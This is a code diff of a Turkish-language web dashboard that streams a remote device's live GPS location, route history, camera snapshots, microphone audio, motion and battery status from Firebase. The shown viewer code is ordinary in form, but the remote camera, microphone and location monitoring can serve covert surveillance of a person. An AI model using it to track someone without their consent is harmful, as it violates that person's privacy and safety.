+                        // Uptime güncelle
+                        if (data.uptime) {
+                            const minutes = Math.floor(data.uptime / 60);
+                            document.getElementById('uptimeBadge').textContent = '⏱️ ' + minutes + 'dk';
+                        }
+                    }
+                });
+                this.listeners.push(heartbeatRef);
+
+                // Location
                 const locRef = deviceRef.child('location');
                 locRef.on('value', (snap) => {
                     const data = snap.val();
-                    if (data) this.updateLocation(data);
+                    if (data) {
+                        this.updateLocation(data);
+                        this.dataReceived += 0.5;
+                        document.getElementById('dataDisplay').textContent = Math.round(this.dataReceived);
+                    }
                 });
                 this.listeners.push(locRef);
 
-                // Kamera
+                // Camera
                 const camRef = deviceRef.child('camera');
                 camRef.on('value', (snap) => {
                     const data = snap.val();
-                    if (data && data.image) this.updateCamera(data.image);
+                    if (data && data.image) {
+                        this.updateCamera(data);
+                        this.dataReceived += 30;
+                        document.getElementById('dataDisplay').textContent = Math.round(this.dataReceived);
+                    }
                 });
                 this.listeners.push(camRef);
 
-                // Pil
+                // Battery
                 const batRef = deviceRef.child('battery');
                 batRef.on('value', (snap) => {
                     const data = snap.val();
@@ -675,13 +1029,37 @@
                 });
                 this.listeners.push(batRef);
 
-                // Ses
+                // Motion
+                const motionRef = deviceRef.child('motion');
+                motionRef.on('value', (snap) => {
+                    const data = snap.val();
+                    if (data) this.updateMotion(data);
+                });
+                this.listeners.push(motionRef);
+
+                // Audio Level
+                const audioLevelRef = deviceRef.child('audioLevel');
+                audioLevelRef.on('value', (snap) => {
+                    const data = snap.val();
+                    if (data) this.updateAudioLevel(data);
+                });
+                this.listeners.push(audioLevelRef);
+
+                // Audio
                 const audioRef = deviceRef.child('audio');
                 audioRef.on('value', (snap) => {
                     const data = snap.val();
                     if (data && data.data) this.handleAudioData(data.data);
                 });
                 this.listeners.push(audioRef);
+
+                // History
+                const historyRef = deviceRef.child('history').limitToLast(20);
+                historyRef.on('value', (snap) => {
+                    const data = snap.val();
+                    if (data) this.updateHistory(data);
+                });
+                this.listeners.push(historyRef);
             }
 
             updateConnectionStatus(online) {
@@ -689,38 +1067,49 @@
                 const text = document.getElementById('statusText');
                 const btn = document.getElementById('connectBtn');
                 const audioBtn = document.getElementById('playAudioBtn');
+                const liveBadge = document.getElementById('liveBadge');
+                const heartbeat = document.getElementById('heartbeatIndicator');
 
                 if (online) {
                     dot.classList.add('online');
                     text.textContent = 'Bağlı';
                     btn.textContent = 'Bağlandı ✓';
                     audioBtn.disabled = false;
+                    liveBadge.style.display = 'flex';
+                    heartbeat.classList.remove('hidden');
+                    document.getElementById('heartbeatText').textContent = 'Bağlı';
                     document.getElementById('mapOverlay').classList.add('hidden');
-                    document.getElementById('audioStatus').querySelector('span').textContent = 'Aktif';
+                    document.getElementById('mapInfo').style.display = 'block';
                     this.isConnected = true;
                 } else {
                     dot.classList.remove('online');
                     text.textContent = 'Çevrimdışı';
                     btn.textContent = 'Bağlan';
                     audioBtn.disabled = true;
-                    document.getElementById('audioStatus').querySelector('span').textContent = 'Bekleniyor';
+                    liveBadge.style.display = 'none';
+                    document.getElementById('heartbeatText').textContent = 'Bekleniyor...';
                     this.isConnected = false;
                 }
             }
 
             updateLocation(data) {
-                const { lat, lng, accuracy, speed, timestamp } = data;
+                const { lat, lng, accuracy, speed, timestamp, updateCount, totalDistance } = data;
 
                 document.getElementById('latDisplay').textContent = lat.toFixed(6);
                 document.getElementById('lngDisplay').textContent = lng.toFixed(6);
-                document.getElementById('accDisplay').textContent = Math.round(accuracy) + ' m';
-                document.getElementById('speedDisplay').textContent = speed ? (speed * 3.6).toFixed(1) + ' km/s' : '0 km/s';
+                document.getElementById('accDisplay').textContent = Math.round(accuracy);
+                document.getElementById('speedDisplay').textContent = speed ? Math.round(speed * 3.6) : '0';
+                document.getElementById('distanceDisplay').textContent = totalDistance || 0;
+                document.getElementById('updateDisplay').textContent = updateCount || 0;
                 document.getElementById('statusTime').textContent = new Date(timestamp).toLocaleTimeString('tr-TR');
+
+                document.getElementById('mapInfoCoords').textContent = `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
+                document.getElementById('mapInfoTime').textContent = new Date(timestamp).toLocaleTimeString('tr-TR');
 
                 this.updateMarker(lat, lng);
                 this.addToRoute(lat, lng);
 
-                if (this.routePoints.length === 1) {
+                if (this.routePoints.length === 1 || this.followMode) {
                     this.centerMap();
                 }
             }
@@ -751,24 +1140,75 @@
 
             addToRoute(lat, lng) {
                 const last = this.routePoints[this.routePoints.length - 1];
-                if (last && last[0] === lat && last[1] === lng) return;
+                if (last && Math.abs(last[0] - lat) < 0.00001 && Math.abs(last[1] - lng) < 0.00001) return;
 
                 this.routePoints.push([lat, lng]);
                 this.polyline.setLatLngs(this.routePoints);
             }
 
-            updateCamera(imageData) {
+            updateCamera(data) {
                 const img = document.getElementById('cameraImage');
                 const placeholder = document.getElementById('cameraPlaceholder');
+                const timeEl = document.getElementById('cameraTime');
 
-                img.src = imageData;
+                img.src = data.image;
                 img.style.display = 'block';
                 placeholder.style.display = 'none';
+                timeEl.textContent = new Date(data.timestamp).toLocaleTimeString('tr-TR');
             }
 
             updateBattery(data) {
-                const display = document.getElementById('batteryDisplay');
-                display.textContent = data.level + '%' + (data.charging ? '⚡' : '');
+                const badge = document.getElementById('batteryBadge');
+                badge.textContent = data.level + '%' + (data.charging ? ' ⚡' : '');
+                
+                if (data.level < 20 && !data.charging) {
+                    badge.classList.add('low');
+                } else {
+                    badge.classList.remove('low');
+                }
+            }
+
+            updateMotion(data) {
+                const badge = document.getElementById('motionBadge');
+                
+                if (data.isMoving) {
+                    badge.className = 'badge moving';
+                    badge.textContent = '🏃 Hareket';
+                } else {
+                    badge.className = 'badge still';
+                    badge.textContent = '🧍 Durağan';
+                }
+            }
+
+            updateAudioLevel(data) {
+                const badge = document.getElementById('audioLevelBadge');
+                badge.textContent = data.level + ' dB';
+
+                const bars = document.querySelectorAll('.audio-bar');
+                bars.forEach((bar, i) => {
+                    const height = Math.random() * data.level * 0.4 + 5;
+                    bar.style.height = height + 'px';
+                });
+            }
+
+            updateHistory(data) {
+                const container = document.getElementById('historyList');
+                container.innerHTML = '';
+
+                const entries = Object.values(data).reverse().slice(0, 10);
+                
+                entries.forEach(item => {
+                    const div = document.createElement('div');
+                    div.className = 'history-item';
+                    div.innerHTML = `
+                        <span class="history-time">${new Date(item.timestamp).toLocaleTimeString('tr-TR')}</span>
+                        <span class="history-coords">${item.lat.toFixed(5)}, ${item.lng.toFixed(5)}</span>
+                    `;
+                    div.addEventListener('click', () => {
+                        this.map.setView([item.lat, item.lng], 16);
+                    });
+                    container.appendChild(div);
+                });
             }
 
             handleAudioData(base64Data) {
@@ -777,8 +1217,6 @@
                 if (this.isPlaying) {
                     this.playNextAudio();
                 }
-
-                this.animateVisualizer();
             }
 
             toggleAudio() {
@@ -787,11 +1225,11 @@
                 if (this.isPlaying) {
                     this.isPlaying = false;
                     btn.textContent = '🔊';
-                    btn.style.background = 'linear-gradient(135deg, #00ff88, #00d9ff)';
+                    btn.classList.remove('playing');
                 } else {
                     this.isPlaying = true;
                     btn.textContent = '🔇';
-                    btn.style.background = '#ff4d4d';
+                    btn.classList.add('playing');
                     this.playNextAudio();
                 }
             }
@@ -805,29 +1243,23 @@
                     const audio = new Audio(audioData);
                     audio.volume = this.volume;
                     
-                    audio.onended = () => {
-                        this.playNextAudio();
-                    };
-                    
-                    audio.onerror = () => {
-                        this.playNextAudio();
-                    };
+                    audio.onended = () => this.playNextAudio();
+                    audio.onerror = () => this.playNextAudio();
 
-                    audio.play().catch(() => {
-                        this.playNextAudio();
-                    });
+                    audio.play().catch(() => this.playNextAudio());
                 } catch (e) {
-                    console.error('Ses oynatma hatası:', e);
                     this.playNextAudio();
                 }
             }
 
-            animateVisualizer() {
-                const bars = document.querySelectorAll('.audio-bar');
-                bars.forEach(bar => {
-                    const height = Math.random() * 25 + 5;
-                    bar.style.height = height + 'px';
-                });
+            capturePhoto() {
+                const img = document.getElementById('cameraImage');
+                if (!img.src) return;
+
+                const link = document.createElement('a');
+                link.download = `capture_${Date.now()}.jpg`;
+                link.href = img.src;
+                link.click();
             }
 
             centerMap() {
@@ -836,9 +1268,19 @@
                     this.map.setView(last, 16, { animate: true });
                 }
             }
+
+            clearRoute() {
+                if (confirm('Rota geçmişi silinecek. Emin misiniz?')) {
+                    this.routePoints = [];
+                    this.polyline.setLatLngs([]);
+                    document.getElementById('historyList').innerHTML = '';
+                    
+                    db.ref('devices/' + this.code + '/history').remove();
+                }
+            }
         }
 
-        new Dashboard();
+        new AdvancedDashboard();
     </script>
 </body>
 </html>
